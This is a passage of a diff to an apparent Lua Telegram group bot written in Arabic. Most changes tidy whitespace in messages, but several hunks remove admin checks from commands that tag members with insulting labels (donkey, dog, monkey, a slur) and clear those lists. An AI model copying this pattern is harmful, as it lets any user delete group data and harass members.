-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7615,7 +7765,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7856,7 +8006,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7882,7 +8032,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7915,7 +8065,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7942,7 +8092,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7964,7 +8114,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -7989,7 +8139,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8006,11 +8156,19 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == 'مسح المدراء الثانين' and BasicConstructor(msg) then
+if text == 'مسح المدراء الثانين' then
+if not BasicConstructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'S00F4:MN:TF'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح المدير ثانيين')
 end
-if text == ("المدراء الثانين") and BasicConstructor(msg) then
+if text == ("المدراء الثانين") then
+if not BasicConstructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'S00F4:MN:TF'..msg.chat_id_)
 t = "\n ☉┇ قائمة المدير ثانيين \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
 for k,v in pairs(list) do
@@ -8026,13 +8184,17 @@ t = " ☉┇ لا يوجد المدير ثانيين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("رفع مدير ثاني") and msg.reply_to_message_id_ and BasicConstructor(msg) then
+if text == ("رفع مدير ثاني") and msg.reply_to_message_id_ then
+if not BasicConstructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8058,7 +8220,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8091,7 +8253,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8112,13 +8274,17 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == ("تنزيل مدير ثاني") and msg.reply_to_message_id_ and BasicConstructor(msg) then
+if text == ("تنزيل مدير ثاني") and msg.reply_to_message_id_ then
+if not BasicConstructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8140,7 +8306,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8165,7 +8331,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8193,7 +8359,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8237,7 +8403,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8289,7 +8455,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8384,7 +8550,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8410,7 +8576,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8444,7 +8610,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8476,7 +8642,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8498,7 +8664,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8523,7 +8689,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8542,18 +8708,10 @@ return false
 end  
 ------------------------------------------------------------------------
 if text == 'تنزيل المطايه' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'Mote:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح جميع المطايه')
 end
 if text == ("تاك للمطايه") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة مطايه الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8571,16 +8729,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع مطي") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8601,16 +8755,12 @@ return false
 end
 
 if (text == ("تنزيل مطي")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8627,18 +8777,10 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح المتزوجين' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'Mode:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح جميع المتزوجين')
 end
 if text == ("تاك للمتزوجين") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
 t = "\n ☉┇ قائمه ازواج الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8656,16 +8798,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("زواج") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8686,16 +8824,12 @@ return false
 end
 
 if (text == ("طلاق")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8712,18 +8846,10 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح الخولات' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'Modde:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل الخولات')
 end
 if text == ("تاك للخولات") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
 t = "\n ☉┇ قائمه خولات الجروب \nٴ•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•ٴ\n"
 for k,v in pairs(list) do
@@ -8741,16 +8867,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع خول") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8771,16 +8893,12 @@ return false
 end
 
 if (text == ("تنزيل خول")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8797,18 +8915,10 @@ return false
 end
 -----------------------------------------------------
 if text == 'تنزيل الصخوله' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'Sakl:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع صخوله من الجروب')
 end
 if text == ("تاك للصخوله") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة صخوله الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8826,16 +8936,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع صخل") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8857,16 +8963,12 @@ end
 
 
 if (text == ("تنزيل صخل")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8883,18 +8985,10 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح الكلاب' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'Motte:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسج كل كلاب الجروب')
 end
 if text == ("تاك للكلاب") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة كلاب الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8912,16 +9006,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع كلب") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8942,16 +9032,12 @@ return false
 end
 
 if (text == ("تنزيل كلب")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -8968,18 +9054,10 @@ return false
 end
 -----------------------------------------------------
 if text == 'تنزيل القروده' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'Motee:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع القروده بالجروب')
 end
 if text == ("تاك للقروده") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة القروده الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8997,16 +9075,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع قرد") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
